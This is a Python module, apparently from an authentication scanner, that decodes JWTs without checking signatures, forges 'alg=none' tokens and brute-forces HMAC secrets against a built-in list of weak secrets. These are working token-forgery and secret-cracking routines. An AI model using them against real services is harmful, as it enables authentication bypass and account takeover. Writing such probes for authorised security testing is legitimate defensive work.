# Análise de JWT sem depender de biblioteca externa — decodificação (sem
# verificar assinatura, é só leitura), forja de alg=none, e brute-force de
# segredo HS256 contra uma wordlist curta. Usado pelos probes ativos de auth.

import base64
import hashlib
import hmac
import json

WEAK_SECRETS = [
    "secret", "password", "123456", "changeme", "admin", "secretkey",
    "jwtsecret", "jwt-secret", "chave-secreta", "segredo", "sentinela",
    "your-256-bit-secret", "supersecret", "senha123",
]


def _b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def decode_jwt(token: str) -> dict | None:
    """Decodifica header e payload (sem verificar assinatura). None se não
    parecer um JWT (3 partes)."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:  # noqa: BLE001
        return None
    return {"header": header, "payload": payload, "signing_input": f"{parts[0]}.{parts[1]}", "signature_b64": parts[2]}


def forge_alg_none(token: str) -> str | None:
    """Reescreve o header pra alg=none, mantém o payload original, zera a
    assinatura — o formato que servidores vulneráveis aceitam sem checar."""
    decoded = decode_jwt(token)
    if not decoded:
        return None
    header = {**decoded["header"], "alg": "none"}
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = decoded["signing_input"].split(".")[1]
    return f"{header_b64}.{payload_b64}."


def find_weak_hmac_secret(token: str, wordlist: list[str] = WEAK_SECRETS) -> str | None:
    """Se o token usa HS256/HS384/HS512, tenta recriar a assinatura com uma
    wordlist curta de segredos comuns. Devolve o segredo se achar, senão None."""
    decoded = decode_jwt(token)
    if not decoded:
        return None
    alg = decoded["header"].get("alg", "")
    algo_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    digestmod = algo_map.get(alg)
    if not digestmod:
        return None

    signing_input = decoded["signing_input"].encode()
    target_sig = decoded["signature_b64"]
    for secret in wordlist:
        sig = hmac.new(secret.encode(), signing_input, digestmod).digest()
        if _b64url_encode(sig) == target_sig:
            return secret
    return None
